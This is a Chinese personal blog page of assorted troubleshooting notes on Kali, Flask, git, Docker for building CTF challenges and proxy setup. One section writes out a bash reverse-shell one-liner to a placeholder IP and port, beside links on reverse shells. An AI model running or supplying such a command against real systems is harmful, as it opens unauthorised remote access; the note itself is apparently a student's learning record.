@@ -1,0 +1,1314 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="一些其他的, q1n9&#39;s blog">
+    <meta name="description" content="1写一下遇到的问题：kali中dirsearch无法使用python3版的可能是没更新(python开头的有的扫不到）输入Y后显示install失败在终端中输入&amp;nbsp;sudo apt -y update&amp;nbsp;和&amp;nbsp;sud">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>一些其他的 | q1n9&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">q1n9&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">q1n9&#39;s blog</div>
+        <div class="logo-desc">
+            
+            welcome to my blog
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">一些其他的</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%9D%82/">
+                                <span class="chip bg-color">杂</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                网安
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-02-13
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-08-27
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>写一下遇到的问题：<br>kali中dirsearch无法使用python3版的可能是没更新(python开头的有的扫不到）<br>输入Y后显示install失败<br>在终端中输入&nbsp;sudo apt -y update&nbsp;和&nbsp;sudo apt -y upgrade&nbsp;来更新软件包列表并升级已安装的软件包。<br>用tplmap要用python2（用了pip2<br>然后版本太新可能用pip3安装依赖时会error提示<br><a href="https://">https://www.yaolong.net/article/pip-externally-managed-environment/</a><br><del>喵的要死了</del><br>感觉还得再优化下弄两个虚拟坏境。。。</p>
+<p>dirseach429请求过多无法正常运行<br>Skipped the target due to 429 status code<br>可加后缀 –max-rate=10之类的降低速率</p>
+<p>kali无法ping github.com<br><a href="https://">https://www.cnblogs.com/byErichas/p/15765816.html</a><br>sudo vim /etc/hosts<br>140.82.113.4 github.com<br>199.232.69.194 github.global.ssl.fastly.net<del>（以前好像在外面用过但还是watt toolkit好用</del><br>E直接编辑，i插入，ctrl+c退出，:wq!保存</p>
+<p>kali仍无法git clone<br>可能是代理问题哈<br><a href="https://">https://blog.csdn.net/qq_31267769/article/details/107017322</a></p>
+<p>请求查询参数（GET)请求主体参数（POST）</p>
+<p>云服务器往近了选（是谁住在山西选的广州哈哈哈</p>
+<p>ssh连linux是root为用户名！！！Administrator是windows的（哭</p>
+<p>比起FinalShell什么的似乎mac终端/MobaXterm(Windows)更好？</p>
+<p>远程用ToDesk</p>
+<p>systemctl restart sshd</p>
+<p>history|grep git(查找历史有git的命令）</p>
+<p>flask:<br><a href="https://">https://tutorial.helloflask.com/hello/</a><br>安装flask的版本是最好按这个上面书上说的，安装2.1.3，而不是最新版本。因为他后面讲数据库的时候，他会要你安装，二点几的SQL alchemy，最新的已经到三点多了，会跟数据库那个出冲突。如果你已经安装了三点多，需要降级flask跟werkzeug，具体操作自己问ai。<br>. env/bin/activate  （激活虚拟环境）deactivate(退）<br>./pycharm.sh（运行pycharm)<br>pycharm中flask（我的本机pycharm上有插件,但kali安装的没有（提一嘴我这种操作没必要，在windows上弄就行<br><a href="https://">https://www.cnblogs.com/pysele/p/12459134.html</a><br> 注意app.py需在确保当前目录是项目的根目录下。(watchlist)<br>@app.route(‘/‘): / 对应的是主机名后面的路径部分<br>nano .gitignore（编辑） Control + O 和 Enter 键保存，然后按下 Control + X 键退出（我更用惯vim<br>当 python-dotenv 安装后，Flask 会从项目根目录的 .flaskenv 和 .env 文件读取环境变量并设置。<br>touch 命令创建touch .env .flaskenv。.flaskenv 用来存储 Flask 命令行系统相关的公开环境变量；而 .env 则用来存储敏感数据<br>上传图片需纯净url可访问（当然用静态文件的话就不用，用css调，换class），用width=”350” height=”200”之类的调大小<br><img src="https://pick.lwzheng.tech/2025/01/21/678f356627896.png" alt="3dda50312a9b80b6201a94ff0187b586.png"><br>这个后续记得删除，不然会覆盖<br>还有就是模板中寻找链接的图片，好像会从头开始寻找。尽管我把一个名为donk.png图片放在static的下面，在实际中，它仍然显示的是我位于image文件夹（在static文件夹下）下的donk1.png（因为我image文件夹在图片donk.png前面）<br>而当我把donk.png改为dooonk.png就可以正确显示了<br>因此我认为最好不要往文件名加入数字(似乎会混淆）<br>用ctrl+D退出flask shell<br>在创建里向数据库中添加记录中加from app import db（出现<br>db.session.add(user)<br>Traceback (most recent call last):<br>  File “<console>“, line 1, in <module><br>NameError: name ‘db’ is not defined报错的话），导入db对象，不知道为啥文里没写。<br>&lt;模型类&gt;.query.&lt;过滤方法（可选）&gt;.&lt;查询方法&gt;<br>用 @app.cli.command() 装饰器来注册。。 函数。flask xxx<br><del>终于体验到程序员改bug的崩溃了，修了好多次（</del><br>用PythonAnywhere注册时需要挂个梯子<br>我第一次显示dotenv 模块没有被找到，重装了一遍虚拟环境后可了<br>还有就是它可能版本比较低，安requirement.txt时有的版本没有（我的都是最新版本的),得自己改一下再下<br><a target="_blank" rel="noopener" href="https://qing777.pythonanywhere.com/">https://qing777.pythonanywhere.com/</a></module></console></p>
+<p>git add .不了可能是多创了一个/watchlist文件夹<br>git push失败：致命错误：无法读取远程仓库。请确认您有正确的访问权限并且仓库存在。<br>可能是url后没加.git<br>或者将远程仓库删除后重新remote一遍<br>git branch -M main ，git remote add origin <a href="mailto:git@github.com">git@github.com</a>:lingqing777/watchlist.git，git push -u origin main</p>
+<p>picgo下载后打不开，发现在右下角托盘里点可<br><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/51b06b3e24060e1e1d79d317fc77e2d8.png"><del>(这测试链接的图片也太抽象了吧</del></p>
+<p>有的人github图床不稳定猜想是steam++（改hosts)的问题，我的暂时观察还行，建议用vpn稳定些</p>
+<p>phpstudy的话var_dump(scandir(chr(47)));读取根目录竟然是 D盘（</p>
+<p><strong>将VMware Network Adapter VMnet8的IP改为与虚拟机IP同一网段</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52555162/article/details/121036987">kali 使用命令ifconfig查询ip地址一直为127.0.0.1的解决办法_kali的ip地址是127.0.0.1-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TreeSky/p/17330560.html">VMware 主机(宿主)电脑访问虚拟机的服务—配置网络连接方式 - dong瓜(TreeSky) - 博客园</a>且<code>app.run(host = '0.0.0.0')</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/p/15187295.html">Kali Linux 不能联网上网 解决方法汇总（搬运） - z9m8r8 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ww1473345713/article/details/51490525">【Linux】NAT模式下关于主机ping不通虚拟机的问题_nat模式主机ping虚拟机超时-CSDN博客</a></p>
+<p>我的是本机pingkali超时，然后重启解决（</p>
+<p>我说实话%90的问题重新启动可解决（</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52316372/article/details/125748020">Typora打开md文档出现乱码？一步搞定！_为什么以md结尾的文件修复后内容乱码-CSDN博客</a></p>
+<p>图床上传typora无法显示，重新截图再上传，也可能是网管代理上传失败了（</p>
+<p>burpsuit是啥，不认识，我只对yakit一心一意（渣渣灰</p>
+<p>ctrl+A全选</p>
+<p><del>这么看来遇到这么多问题真是太惨了（哭</del></p>
+<hr>
+<p>有生之年一定要搞个歌单狠狠宣传一下我宣的宝藏歌手^_^</p>
+<p>其他的一些再说吧，先放到这，又要消失了（</p>
+<hr>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><a target="_blank" rel="noopener" href="https://blog.pcat.cc/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/%E6%95%B0%E5%AD%A6%E8%BF%90%E7%AE%97%E3%80%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/cyberchef">pcat.cc</a></p>
+<p>用联想浏览器打开CyberChef会出些意外，换个浏览器就好了</p>
+<p>初次使用劫持工具无法达到想要的响应是认证问题</p>
+<p>当前无法使用此页面<br>cn.bing.com 重定向你太多次。<a target="_blank" rel="noopener" href="https://yebd1h.smartapps.cn/pages/blog/index?blogId=140184414&amp;_swebfr=1&amp;_swebFromHost=baiduboxapp">CSDN编程社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lanlangaogao/article/details/122535848">Edge 修改字符编码（详细图文）_edge浏览器编码设置-CSDN博客</a></p>
+<p>win10更新后edge找不到服务器，Microsoft Edge 使用你当前的服务提供商，改成使用当前的服务提供商。好多次拒绝我就换个（渣</p>
+<p>Requestbin<a target="_blank" rel="noopener" href="https://www.cnblogs.com/li9club/p/12381847.html">介绍两个调试http/https交互的模拟工具之一：使用requestbin的HTTPBin检查你发送的数据 - li9club - 博客园</a></p>
+<p>1.我之前用过的云服务器都是linux跟windows一体的，可以直接ssh连上；并且我其实不太清楚ssh的原理，还以为只要B机单向安装ssh即可（。此次使用了win的实例，便由此造成了困扰。<br>2.开启ssh服务用这个也许会更方便<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/2882095347">https://zhuanlan.zhihu.com/p/2882095347</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/28696f4c20a14f696c31be464e9cca57.png"></p>
+<p>3.关于用户名Administrator试了一下，首字母小a与大A都可以。<br>4.我有win实例，还要ssh确实是自找烦恼，我连上后，想再试一遍，显示Permission denied，还得去改，有一种在powershell上用linux的美（</p>
+<p>但没事可以改（</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a38e6932da29acb932ecb42112b2ba60.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a548572be0cbe9adfec9826fd2ad2adc.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8987?time__1311=Yq0x2D0DnQG=qGNenDUrxIxxRxg2qYDcioD&amp;u_atoken=2f55c9ea5d650a6d777fe2d86b85f621&amp;u_asig=1a0c399717430900032761485e004c">文章 - 反弹Shell，看这一篇就够了 - 先知社区</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/301c3d2a070dc26db9c1ac720190b2c3.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">bash -c "bash -i &gt;&amp; /dev/tcp/x.xxx.xxx.xxx/7777 0&gt;&amp;1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43199509/article/details/120028288">反弹shell失败 原来是这个原因_反弹shell时kali监听不到端口数据怎么办-CSDN博客</a></p>
+<p>pycharm下不了库可以把代理关了再下试试。</p>
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/ted_guangda/article/details/129010030">问题解决][edge]你现在无法访问 XXX.com，因为网站使用的是 HSTS。网络错误和攻击通常是暂时的，因此该页面以后可能会恢复正常。_因为网站使用的是 hsts。网络错误和攻击通常是暂时的,因此该页面以后可能会恢复正-CSDN博客</a></p>
+<hr>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre class="line-numbers language-none"><code class="language-none">wsl.exe -d Ubuntu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/wsl/tutorials/wsl-containers">https://learn.microsoft.com/zh-cn/windows/wsl/tutorials/wsl-containers</a></p>
+<pre class="line-numbers language-none"><code class="language-none"> 1、docker pull openresty/openresty:alpine
+ 
+ 2、docker build -t magic-mirror .
+ 
+ 3、 docker images
+REPOSITORY            TAG       IMAGE ID       CREATED          SIZE
+&lt;none&gt;                &lt;none&gt;    0beeea22be24   10 minutes ago   319MB
+
+4、 docker run -d --name ctfprofile -p 8080:80 0beeea22be24
+docker run -d --name mirror -p 8081:8080 0beeea22be24
+docker run -d --name mirror -p 8081:8888 38f387eaaac1
+d251dd8e43c3e2e1fa24f668979a75b8fdc9723e25c3b6fc6370692e133c6c0b（容器 ID )
+
+
+或 
+docker run --rm -p 8081:8080 -e GZCTF_FLAG='flag{YOUR_REAL_FLA
+G}' magic-mirror
+
+*docker ps（检测是否成功）
+CONTAINER ID   IMAGE          COMMAND                   CREATED          STATUS          PORTS                                     NAMES
+d251dd8e43c3   0beeea22be24   "/docker-entrypoint.…"   18 seconds ago   Up 17 seconds   0.0.0.0:8080-&gt;80/tcp, [::]:8080-&gt;80/tcp   ctfprofile
+
+5、Start-Process "http://localhost:8080"(powershell)
+start http://localhost:8081(cmd)
+
+ 6、docker logs -f ctfprofile
+ 
+ 
+ # 创建临时容器检查
+//docker run --rm -it mirror sh
+//~ $ ls
+//ctf-app     robots.txt
+//~ $ exit
+
+
+
+docker tag mirror q1n9g/hashctf-mirror:latest（改标签）
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">D:\Desktop\ctf\出题\1&gt;docker-compose up -d --build
+[+] Running 2/2
+ ✔ Network 1_mikus-network  Created                                                                                0.1s
+ ✔ Container mikus-blog     Started                                                                                0.5s
+
+D:\Desktop\ctf\出题\1&gt;docker logs -f mikus-blog
+
+docker exec -it mikus-blog bash
+
+docker compose down
+docker compose build --no-cache
+docker compose up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>映射到8081即可，用内置浏览器</p>
+<p><a target="_blank" rel="noopener" href="https://www.lamber-maybe.com/2024/10/14/Burp%E6%8F%92%E4%BB%B6%E4%B9%8BParam-Miner/">Burp插件之Param-Miner | Lamber’s Blog</a></p>
+<pre class="line-numbers language-none"><code class="language-none">127.0.0.1
+::1
+localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><a target="_blank" rel="noopener" href="http://blinkfox.com/2018/09/28/qian-duan/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/">http://blinkfox.com/2018/09/28/qian-duan/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://sulawesi02.github.io/2024/08/17/2024-08-17-%E4%BD%BF%E7%94%A8-Hexo-+-GitHub-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">使用 Hexo + GitHub 搭建个人博客 - Sulawesi02’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60578464">(1 封私信 / 34 条消息) 使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎</a></p>
+<p>公钥：</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\16256\.ssh、id_rsa.pub
+
+
+hexo g
+hexo s
+hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/blinkfox/hexo-theme-matery/issues/919">https://github.com/blinkfox/hexo-theme-matery/issues/919</a></p>
+<hr>
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre class="line-numbers language-none"><code class="language-none">go env -w GOPROXY=https://goproxy.cn,direct
+go env GOPROXY
+# 输出应为：https://goproxy.cn,direct
+go get -u github.com/gin-gonic/gin
+
+
+go run .
+php -S localhost:8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><pre class="line-numbers language-none"><code class="language-none">pip因 SSL 协议错误无法下载
+如果你正在使用代理（如系统代理、VPN、Clash 等），尝试临时关闭所有代理工具，然后重新安装：
+原因：部分代理会修改 HTTPS 流量，导致 SSL 握手时协议不匹配（如强制使用低版本 TLS 或拦截证书）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/141788308">使用 GZCTF 结合 GitHub 仓库搭建独立容器与动态 Flag 的 CTF 靶场+基于 Docker 的 Web 出题与部署+容器权限控制_gzctf动态flag-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/settings/tokens">Personal Access Tokens (Classic)</a></p>
+<pre class="line-numbers language-none"><code class="language-none">docker tag q1n9g/mikus-blog:latest ghcr.io/lingqing777/mikus-blog:latest
+docker tag magic-mirror:latest ghcr.io/lingqing777/magic-mirror:latest
+
+
+
+echo [GitHub Personal Access Token (ghp)] | docker login ghcr.io -u lingqing777 --password-stdin
+Login Succeeded
+
+
+
+docker push ghcr.io/lingqing777/mikus-blog:latest
+docker push ghcr.io/lingqing777/magic-mirror:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>localhost和127.0.0.1不互通的看<code>C:\Windows\System32\drivers\etc\hosts</code>。检查文件中是否有一行 <code>127.0.0.1 localhost</code>，且未被 <code>#</code> 注释（<code>#</code> 开头的行为注释，无效）。 </p>
+<p>yakit不代理127.0.0.1的</p>
+<pre class="line-numbers language-none"><code class="language-none">解决方法：强制让 127.0.0.1 走 Yakit 代理
+1. 针对 Firefox 浏览器的配置（关键步骤）
+Firefox 有专门的配置项控制本地地址是否走代理，需要手动修改：
+
+打开 Firefox，访问 about:config（点击 “接受风险并继续”）。
+搜索并修改以下配置：
+network.proxy.allow_hijacking_localhost
+双击该选项，将值从 false 改为 true（允许代理劫持本地地址，即让 127.0.0.1 走代理）。
+network.proxy.no_proxies_on
+确保该选项的值为空（默认可能包含 localhost,127.0.0.1，需要删除这些内容，避免排除本地地址）。
+重新进入 Firefox 代理设置（about:preferences#general → 网络设置 → 设置），确认：
+手动配置代理为 127.0.0.1 和 Yakit 的监听端口（如 8080）。
+“不使用代理的地址” 输入框为空（无任何内容）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><a target="_blank" rel="noopener" href="https://dev59.com/superuser/DUnSa4cB1Zd3GeqPKg6s">如何在Windows子系统中重置Kali Linux密码 kali-linux windows-subsystem-for-linux password-recovery - Dev59</a></p>
